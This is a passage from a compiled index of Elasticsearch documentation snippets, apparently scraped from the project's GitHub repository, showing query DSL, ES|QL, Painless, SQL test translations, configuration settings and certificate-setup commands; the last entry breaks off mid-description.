Query\nDESCRIPTION: Example of using the all_of rule with ordered=true and max_gaps constraints to find documents containing specific phrase sequences with controlled gap sizes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-intervals-query.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nPOST _search\n{\n  \"query\": {\n    \"intervals\" : {\n      \"my_text\" : {\n        \"all_of\" : {\n          \"ordered\" : true,     \n          \"max_gaps\": 1,\n          \"intervals\" : [\n            {\n              \"match\" : {\n                \"query\" : \"my favorite food\",\n                \"max_gaps\" : 0,\n                \"ordered\" : true\n              }\n            },\n            {\n              \"match\" : {\n                \"query\" : \"cold porridge\",\n                \"max_gaps\" : 4,\n                \"ordered\" : true\n              }\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including ST_INTERSECTS Function Description in Markdown\nDESCRIPTION: This code snippet includes the description documentation for the ST_INTERSECTS function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_intersects.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/st_intersects.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Including MV_SLICE Function Parameters in Markdown\nDESCRIPTION: This snippet includes the markdown file containing the parameters for the MV_SLICE function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_slice.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/mv_slice.md\n:::\n```\n\n----------------------------------------\n\nTITLE: ENRICH with Custom Match Field\nDESCRIPTION: Example demonstrating ENRICH usage with a custom match field specified using the ON clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/enrich.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM languages.csv | ENRICH languages_policy ON lang\n```\n\n----------------------------------------\n\nTITLE: Including STD_DEV Function Examples\nDESCRIPTION: Includes the content of a separate file containing examples of using the STD_DEV function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/std_dev.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/std_dev.md\n:::\n```\n\n----------------------------------------\n\nTITLE: EC2 Availability Zone Awareness Configuration\nDESCRIPTION: YAML configuration to enable automatic availability zone awareness for Elasticsearch nodes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-ec2-usage.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ncloud.node.auto_attributes: true\ncluster.routing.allocation.awareness.attributes: aws_availability_zone\n```\n\n----------------------------------------\n\nTITLE: NULL Check Operations\nDESCRIPTION: Examples of IS NULL and IS NOT NULL checks in WHERE and HAVING clauses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test WHERE keyword IS NULL;\n```\n\nLANGUAGE: json\nCODE:\n```\n\"query\":{\"bool\":{\"must_not\":[{\"exists\":{\"field\":\"keyword\",\n```\n\n----------------------------------------\n\nTITLE: Byte Type Compound Assignment\nDESCRIPTION: Shows compound assignment with byte type demonstrating implicit casting behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_10\n\nLANGUAGE: painless\nCODE:\n```\nbyte b = 1;\nb += 2;\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Authentication in Elasticsearch YAML\nDESCRIPTION: Enables authentication using the AUTH command for SMTP servers. Defaults to false.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.auth\n```\n\n----------------------------------------\n\nTITLE: Including ESQL Percentile Documentation Note\nDESCRIPTION: Markdown include directive referencing the percentile aggregation documentation file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/appendix/percentile.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} /reference/aggregations/_snippets/search-aggregations-metrics-percentile-aggregation-approximate.md\n```\n\n----------------------------------------\n\nTITLE: TAN Function Documentation Header\nDESCRIPTION: Documentation header and metadata for the TAN function in ESQL\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/tan.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `TAN` [esql-tan]\n```\n\n----------------------------------------\n\nTITLE: Code Analysis Example - Java Import Statement\nDESCRIPTION: Sample Java code to demonstrate pattern capture tokenization\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-capture-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nimport static org.apache.commons.lang.StringEscapeUtils.escapeHtml\n```\n\n----------------------------------------\n\nTITLE: ES|QL Triple-Quote String Literals\nDESCRIPTION: Example of using triple quotes for string literals containing quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-syntax.md#2025-04-21_snippet_5\n\nLANGUAGE: esql\nCODE:\n```\nROW name = \"\"\"Indiana \"Indy\" Jones\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Logging Error Message in Java\nDESCRIPTION: Example of logging an ERROR level message in FsHealthService when data path health check fails. Demonstrates proper error logging with exception details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_18\n\nLANGUAGE: java\nCODE:\n```\nlogger.error(() -> \"health check of [\" + path + \"] failed\", ex);\n```\n\n----------------------------------------\n\nTITLE: Whitelist CompositeFieldScript Class in Painless\nDESCRIPTION: This snippet whitelists the `org.elasticsearch.script.CompositeFieldScript` class in Painless, preventing it from being imported directly. This class serves as the base for composite field scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.composite_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\n\"class org.elasticsearch.script.CompositeFieldScript @no_import {\n}\"\n```\n\n----------------------------------------\n\nTITLE: Requiring SMTP STARTTLS in Elasticsearch YAML\nDESCRIPTION: Makes STARTTLS command required, causing connection failure if the command fails. Defaults to false.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.starttls.required\n```\n\n----------------------------------------\n\nTITLE: Calendar Management in Java\nDESCRIPTION: This snippet defines the Calendar class along with various fields and methods to manipulate and retrieve date and time information in a locale-sensitive manner. It includes functionality for adding and comparing dates, obtaining localized calendar types, and more.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_9\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Calendar {\n  int ALL_STYLES\n  int AM\n  int AM_PM\n  int APRIL\n  int AUGUST\n  int DATE\n  int DAY_OF_MONTH\n  int DAY_OF_WEEK\n  int DAY_OF_WEEK_IN_MONTH\n  int DAY_OF_YEAR\n  int DECEMBER\n  int DST_OFFSET\n  int ERA\n  int FEBRUARY\n  int FIELD_COUNT\n  int FRIDAY\n  int HOUR\n  int HOUR_OF_DAY\n  int JANUARY\n  int JULY\n  int JUNE\n  int LONG\n  int LONG_FORMAT\n  int LONG_STANDALONE\n  int MARCH\n  int MAY\n  int MILLISECOND\n  int MINUTE\n  int MONDAY\n  int MONTH\n  int NARROW_FORMAT\n  int NARROW_STANDALONE\n  int NOVEMBER\n  int OCTOBER\n  int PM\n  int SATURDAY\n  int SECOND\n  int SEPTEMBER\n  int SHORT\n  int SHORT_FORMAT\n  int SHORT_STANDALONE\n  int SUNDAY\n  int THURSDAY\n  int TUESDAY\n  int UNDECIMBER\n  int WEDNESDAY\n  int WEEK_OF_MONTH\n  int WEEK_OF_YEAR\n  int YEAR\n  int ZONE_OFFSET\n  void add(int,int)\n  boolean after(Object)\n  boolean before(Object)\n  void clear()\n  void clear(int)\n  def clone()\n  int compareTo(Calendar)\n  int get(int)\n  int getActualMaximum(int)\n  int getActualMinimum(int)\n  Set getAvailableCalendarTypes()\n  Locale[] getAvailableLocales()\n  String getCalendarType()\n  String getDisplayName(int,int,Locale)\n  Map getDisplayNames(int,int,Locale)\n  int getFirstDayOfWeek()\n  int getGreatestMinimum(int)\n  Calendar getInstance() @nondeterministic\n  Calendar getInstance(TimeZone) @nondeterministic\n  Calendar getInstance(TimeZone,Locale) @nondeterministic\n  int getLeastMaximum(int)\n  int getMaximum(int)\n  int getMinimalDaysInFirstWeek()\n  int getMinimum(int)\n  Date getTime()\n  long getTimeInMillis()\n  TimeZone getTimeZone()\n  int getWeeksInWeekYear()\n  int getWeekYear()\n  boolean isLenient()\n  boolean isSet(int)\n  boolean isWeekDateSupported()\n  void roll(int,int)\n  void set(int,int)\n  void set(int,int,int)\n  void set(int,int,int,int,int)\n  void set(int,int,int,int,int,int)\n  void setFirstDayOfWeek(int)\n  void setLenient(boolean)\n  void setMinimalDaysInFirstWeek(int)\n  void setTime(Date)\n  void setTimeInMillis(long)\n  void setTimeZone(TimeZone)\n  void setWeekDate(int,int,int)\n  Instant toInstant()\n}\n```\n\n----------------------------------------\n\nTITLE: Monitor Snapshot Privilege\nDESCRIPTION: Allows viewing repository and snapshot details. Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\nmonitor_snapshot\n```\n\n----------------------------------------\n\nTITLE: Monitor Stats Privilege\nDESCRIPTION: Provides access to view statistics details. Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\nmonitor_stats\n```\n\n----------------------------------------\n\nTITLE: Importing Certificates into Single PKCS#12 Keystore\nDESCRIPTION: This snippet imports the previously converted PKCS#12 certificates into a single PKCS#12 keystore, streamlining certificate management.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n# 9. Import Certs into single PKCS#12 keystore\n\nfor Cert in cert1 cert2 \ndo\n    keytool -importkeystore -noprompt \\\n            -srckeystore $Cert/$Cert.p12 -srcstoretype PKCS12 -srcstorepass p12-pass  \\\n            -destkeystore cert-all/certs.p12 -deststoretype PKCS12 -deststorepass p12-pass\ndone\n```\n\n----------------------------------------\n\nTITLE: PowerShell Command for SharePoint Authentication\nDESCRIPTION: PowerShell command to set DisableCustomAppAuthentication to false for SharePoint tenant configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nset-spotenant -DisableCustomAppAuthentication $false\n```\n\n----------------------------------------\n\nTITLE: Regular Expression Query Syntax\nDESCRIPTION: Demonstrates embedding regular expression patterns within Elasticsearch query strings using forward slashes\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_4\n\nLANGUAGE: elasticsearch\nCODE:\n```\nname:/joh?n(ath[oa]n)/\n```\n\n----------------------------------------\n\nTITLE: Compound Assignment Grammar Definition\nDESCRIPTION: Formal grammar definition for compound assignment operators in Painless language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\ncompound_assignment: ( ID | field ) '$=' expression;\n```\n\n----------------------------------------\n\nTITLE: Java Compatibility Dependency\nDESCRIPTION: Dependency specification for Java > 8 compatibility using javax.activation library\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xml-module-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: maven\nCODE:\n```\ncom.sun.activation:javax.activation\n```\n\n----------------------------------------\n\nTITLE: Setting Background Superset Parameter\nDESCRIPTION: Configuration for specifying whether the background filter represents a different set of documents for comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n\"background_is_superset\": false\n```\n\n----------------------------------------\n\nTITLE: Logging Warning Message in Java\nDESCRIPTION: Example of logging a WARN level message in DiskThresholdMonitor when disk threshold is breached. Shows proper formatting of warning messages with dynamic parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_17\n\nLANGUAGE: java\nCODE:\n```\nlogger.warn(\"flood stage disk watermark [{}] exceeded on {}, all indices on this node will be marked read-only\", diskThresholdSettings.describeFloodStageThreshold(total, false), usage);\n```\n\n----------------------------------------\n\nTITLE: Script Field with Unsigned Long in Elasticsearch\nDESCRIPTION: This snippet shows how to use a script field to perform operations on an unsigned long field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/unsigned-long.md#2025-04-22_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /my_index/_search\n{\n    \"query\": {\n        \"match_all\" : {}\n    },\n    \"script_fields\": {\n        \"count10\" : {\n          \"script\": {\n            \"source\": \"Long.divideUnsigned(doc['my_counter'].value, 10)\"\n          }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Output of ASCII Folding Filter Processing\nDESCRIPTION: The tokens produced by the ASCII folding filter after processing the input text 'açaí à la carte'. The diacritical marks have been removed, converting 'açaí' to 'acai' and 'à' to 'a'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-asciifolding-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ acai, a, la, carte ]\n```\n\n----------------------------------------\n\nTITLE: EQL In Filter with String List\nDESCRIPTION: Checks process names against a list of values. Validates translation into a terms query including multiple possible names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_4\n\nLANGUAGE: basic\nCODE:\n```\nprocess where process_name in (\"python.exe\", \"SMSS.exe\", \"explorer.exe\")\n;\n\"terms\":{\"process_name\":[\"python.exe\",\"SMSS.exe\",\"explorer.exe\"],\n;\n```\n\n----------------------------------------\n\nTITLE: Defining Bulgarian Stop Words\nDESCRIPTION: Defines Bulgarian stop words within Elasticsearch, providing a link to the Lucene file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_9\n\nLANGUAGE: markdown\nCODE:\n```\n`_bulgarian_`\n:   [Bulgarian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/bg/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Filtering Data with WHERE Clause - JavaScript\nDESCRIPTION: The following snippet demonstrates data filtering via a `WHERE` clause in a PostgreSQL query. It selects entries from the employee table where `emp_id` is greater than 5.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"tables\": [\"employee\"],\n    \"query\": \"SELECT * FROM employee WHERE emp_id > 5\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Indexing a Second Document with Different Programming Languages\nDESCRIPTION: This snippet shows how to index another document with a different set of programming languages while still requiring 2 matches. This provides another document for demonstrating the terms set query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-set-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /job-candidates/_doc/2?refresh\n{\n  \"name\": \"Jason Response\",\n  \"programming_languages\": [ \"java\", \"php\" ],\n  \"required_matches\": 2\n}\n```\n\n----------------------------------------\n\nTITLE: Describing Task Management Implementation\nDESCRIPTION: Documentation of Elasticsearch's task management system explaining how tasks are tracked across threads using ThreadContext and ThreadPool. Tasks provide management and visibility of cluster workload with unique IDs per node.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/DistributedArchitectureGuide.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n// Example task ID format\n\"oTUltX4IQMOUUVeiohTt8A:124\" // {node-ID}:{local-task-ID}\n```\n\n----------------------------------------\n\nTITLE: Importing Certificates into Opposite Keystores in Elasticsearch\nDESCRIPTION: These commands import the client certificate into the server keystore and the server certificate into the client keystore. This step is crucial for mutual authentication between server and client in a secure Elasticsearch setup.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/sql-client/src/test/resources/ssl/readme.txt#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ keytool -v -importcert -alias client -file client.crt -keystore server.keystore -storepass password\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ keytool -v -importcert -alias server -file server.crt -keystore client.keystore -storepass password\n```\n\n----------------------------------------\n\nTITLE: Supported Media Types for REST API Compatibility\nDESCRIPTION: List of the four supported media types that can be used with the compatible-with parameter in both Accept and Content-Type headers for REST API compatibility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n\"application/vnd.elasticsearch+json;compatible-with=7\"\n\"application/vnd.elasticsearch+yaml;compatible-with=7\"\n\"application/vnd.elasticsearch+smile;compatible-with=7\"\n\"application/vnd.elasticsearch+cbor;compatible-with=7\"\n```\n\n----------------------------------------\n\nTITLE: Installing Eland with PyTorch Support\nDESCRIPTION: Command to install Eland with PyTorch support using pip package manager\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_8\n\nLANGUAGE: sh\nCODE:\n```\npython -m pip install eland[pytorch]\n```\n\n----------------------------------------\n\nTITLE: Defining Italian Stop Words\nDESCRIPTION: Defines Italian stop words for use in Elasticsearch analysis, linking to the defined Lucene stop words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_26\n\nLANGUAGE: markdown\nCODE:\n```\n`_italian_`\n:   [Italian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/italian_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Defining Spanish Stop Words\nDESCRIPTION: Defines Spanish stop words within Elasticsearch, with links to the corresponding Lucene resource.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_36\n\nLANGUAGE: markdown\nCODE:\n```\n`_spanish_`\n:   [Spanish stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/spanish_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Unary Positive Operator in Painless\nDESCRIPTION: This snippet demonstrates the use of the unary positive operator '+' with different numeric types in Painless, showing its identity preservation behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_8\n\nLANGUAGE: painless\nCODE:\n```\nint x = +1;\nlong y = +x;\n```\n\n----------------------------------------\n\nTITLE: Exporting All Certificates from PKCS12 Keystore\nDESCRIPTION: Extracts all certificates from a PKCS12 keystore file using openssl. The output is directed to a file named 'all_certs'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/identity-provider/src/test/resources/org/elasticsearch/xpack/idp/saml/idp/README.txt#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nopenssl pkcs12 -in multi_signing.p12 -nokeys -out all_certs\n```\n\n----------------------------------------\n\nTITLE: Example Response for Normalize Aggregation Query\nDESCRIPTION: Sample response from an Elasticsearch query using the Normalize aggregation to calculate percent of total sales, showing the structure of the returned aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-normalize-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"sales\": {\n                  \"value\": 550.0\n               },\n               \"percent_of_total_sales\": {\n                  \"value\": 0.5583756345177665,\n                  \"value_as_string\": \"55.84%\"\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 60.0\n               },\n               \"percent_of_total_sales\": {\n                  \"value\": 0.06091370558375635,\n                  \"value_as_string\": \"06.09%\"\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 375.0\n               },\n               \"percent_of_total_sales\": {\n                  \"value\": 0.38071065989847713,\n                  \"value_as_string\": \"38.07%\"\n               }\n            }\n         ]\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Resetting Custom Scheduling in Elasticsearch Connector\nDESCRIPTION: This code snippet demonstrates how to manually reset custom scheduling for a connector to resolve issues when upgrading from version 8.6 or earlier.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-known-issues.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /.elastic-connectors/_update/connector-id\n{\n  \"doc\": {\n    \"custom_scheduling\": {}\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Console Result in Elasticsearch Docs\nDESCRIPTION: Syntax for specifying expected console results in documentation snippets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/README.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n```console-result\n```\n\n----------------------------------------\n\nTITLE: Painless Script for X-Coordinate Filtering\nDESCRIPTION: This Painless script filters documents based on the X-coordinate of a point field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_17\n\nLANGUAGE: Painless\nCODE:\n```\nInternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalSqlScriptUtils.stX(InternalSqlScriptUtils.geoDocValue(doc,params.v0)),params.v1))\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Local Port in Elasticsearch YAML\nDESCRIPTION: Specifies a local port to use when sending emails. Not configured by default.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_21\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.local_port\n```\n\n----------------------------------------\n\nTITLE: Updating extension name using download URL method in Elasticsearch Service\nDESCRIPTION: API call to update the name of an existing extension created with the download URL method. Only updates metadata without requiring the file to be re-uploaded.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_11\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X POST \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n   \"extension_type\" : \"plugin\",\n    \"name\": \"custom-plugin-07012020\",\n   \"version\" : \"8.4.3\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Docker Configuration for Slack Connector - YAML\nDESCRIPTION: This YAML configuration snippet shows how to set up the Elastic Slack connector by specifying the Elasticsearch host, API key, and connector details. It includes the required settings for running the connector service in a Docker environment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-slack.md#2025-04-21_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: slack\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Default Date Format for date_nanos Field in Elasticsearch\nDESCRIPTION: The default date format used for the date_nanos field type if no custom format is specified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date_nanos.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n\"strict_date_optional_time_nanos||epoch_millis\"\n```\n\n----------------------------------------\n\nTITLE: Bucket Key Calculation in Histogram Aggregation\nDESCRIPTION: The formula used to calculate which bucket a value falls into in a histogram aggregation. The interval must be positive, and the offset must be between 0 and the interval.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nbucket_key = Math.floor((value - offset) / interval) * interval + offset\n```\n\n----------------------------------------\n\nTITLE: Creating and Uploading Elasticsearch Instance Image on GCP\nDESCRIPTION: This snippet demonstrates how to create an image of a running Elasticsearch instance, upload it to Google Cloud Storage, and add it to the images collection. It uses gcimagebundle, gsutil, and gcloud commands.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-cloning.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\n# Create an image of your current instance\nsudo /usr/bin/gcimagebundle -d /dev/sda -o /tmp/\n\n# An image has been created in `/tmp` directory:\nls /tmp\ne4686d7f5bf904a924ae0cfeb58d0827c6d5b966.image.tar.gz\n\n# Upload your image to Google Cloud Storage:\n# Create a bucket to hold your image, let's say `esimage`:\ngsutil mb gs://esimage\n\n# Copy your image to this bucket:\ngsutil cp /tmp/e4686d7f5bf904a924ae0cfeb58d0827c6d5b966.image.tar.gz gs://esimage\n\n# Then add your image to images collection:\ngcloud compute images create elasticsearch-2-0-0 --source-uri gs://esimage/e4686d7f5bf904a924ae0cfeb58d0827c6d5b966.image.tar.gz\n\n# If the previous command did not work for you, logout from your instance\n# and launch the same command from your local machine.\n```\n\n----------------------------------------\n\nTITLE: Plus Operator Examples in Regular Expressions\nDESCRIPTION: Examples showing the plus operator which matches one or more occurrences of the preceding character.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nab+     # matches 'ab', 'abb', 'abbb', etc.\n```\n\n----------------------------------------\n\nTITLE: Using Post-Decrement Operator with 'def' Type in Painless\nDESCRIPTION: This example shows how the post-decrement operator '--' functions with the 'def' type in Painless, demonstrating implicit casting and type handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 1;\nx--;\n```\n\n----------------------------------------\n\nTITLE: Avg Aggregation Result for Histogram Fields in Elasticsearch\nDESCRIPTION: Shows the expected response format for an Avg aggregation on histogram fields, including the computed weighted average.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-avg-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"avg_latency\": {\n      \"value\": 0.29690721649\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Query for LAST Aggregation with Two Arguments\nDESCRIPTION: This SQL query selects the last value of the date field, sorted by the int field, from the test table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_30\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT LAST(date, int) FROM test;\n```\n\n----------------------------------------\n\nTITLE: Example Output from Pattern Analyzer in Elasticsearch\nDESCRIPTION: This snippet shows the example output from the Elasticsearch `pattern` analyzer, demonstrating how the input text is split into terms based on the default pattern (`\\W+`). The output is a list of terms extracted from the input string.\nSOURCE: 